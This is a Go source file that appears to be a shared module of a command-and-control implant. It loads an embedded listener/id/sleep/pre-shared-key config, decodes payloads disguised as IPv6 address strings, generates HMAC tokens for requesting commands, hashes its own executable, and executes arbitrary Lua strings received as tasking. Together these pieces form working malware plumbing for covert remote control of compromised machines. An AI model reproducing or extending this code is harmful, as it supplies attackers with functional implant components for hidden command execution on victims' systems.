package shared

import (
	"crypto/hmac"
	"crypto/sha256"
	_ "embed"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"os"
	"strings"
	"time"

	lua "github.com/yuin/gopher-lua"
)

// Byte array which holds the config file embedded at compile time
//
//go:embed config.json
var configData []byte // Embedded config data

// Config struct to hold configuration
type Config struct {
	Listener string `json:"listener"`
	Id       string `json:"id"`
	Sleep    string `json:"sleep"`
	Psk1     string `json:"psk1"`
	Psk2     string `json:"psk2"`
}

// Function to load configuration from embedded JSON
func LoadConfig() (Config, error) {
	var config Config
	if err := json.Unmarshal(configData, &config); err != nil {
		return Config{}, err
	}
	return config, nil
}

// DecodeIPv6ToString takes a string formatted like an IPv6 address (e.g., ["7465:7374::"])
// and decodes it back into its original string representation.
func DecodeIPv6ToString(encoded string) (string, error) {

	// Remove all non-hexadecimal characters from the encoded string
	hexParts := strings.ReplaceAll(encoded, `"`, "")
	hexParts = strings.ReplaceAll(hexParts, `[`, "")
	hexParts = strings.ReplaceAll(hexParts, `]`, "")
	hexParts = strings.ReplaceAll(hexParts, `:`, "")
	result, _ := hex.DecodeString(hexParts)

	// Return the decoded string
	return string(result), nil
}

// VerifyMessageWithHMAC takes in a message, a received HMAC, and a secret key
// and returns true if the HMAC is valid for the message and secret key.
func VerifyMessageWithHMAC(message, receivedHMAC string, secretKey []byte) bool {
	// Create a new HMAC object using SHA-256
	h := hmac.New(sha256.New, secretKey)
	h.Write([]byte(message))
	computedHMAC := h.Sum(nil)

	// Decode the received HMAC from hexadecimal
	receivedHMACBytes, err := hex.DecodeString(receivedHMAC)
	if err != nil {
		fmt.Println("Error decoding HMAC:", err)
		return false
	}

	// Use hmac.Equal to securely compare the computed HMAC with the received HMAC
	return hmac.Equal(computedHMAC, receivedHMACBytes)
}

// GenerateAuthToken takes in a URI and PSK
// and returns an auth token to use when requesting commands
func GenerateAuthToken(uri, psk string) (string, string) {
	// Generate a timestamp (current Unix time as a string)
	timestamp := fmt.Sprintf("%d", time.Now().Unix())

	// Create the message by combining URI and timestamp
	message := uri + ":" + timestamp

	// Generate HMAC using SHA-256 and the secret key
	h := hmac.New(sha256.New, []byte(psk))
	h.Write([]byte(message))
	token := hex.EncodeToString(h.Sum(nil))

	return token, timestamp
}

func GetSelfHash() []byte {
	// Get the path of the currently running executable
	exePath, err := os.Executable()
	if err != nil {
		log.Fatalf("Failed to get executable path: %v", err)
	}

	// Open the executable file
	exeFile, err := os.Open(exePath)
	if err != nil {
		log.Fatalf("Failed to open executable file: %v", err)
	}
	defer exeFile.Close()

	// Create a SHA-256 hasher and copy the file's contents into it
	hasher := sha256.New()
	if _, err := io.Copy(hasher, exeFile); err != nil {
		log.Fatalf("Failed to hash executable file: %v", err)
	}
	return hasher.Sum(nil)
}

func DoLua(LuaStr string) bool {
	L := lua.NewState()
	defer L.Close()
	if err := L.DoString(LuaStr); err != nil {
		return false
	}
	return true
}
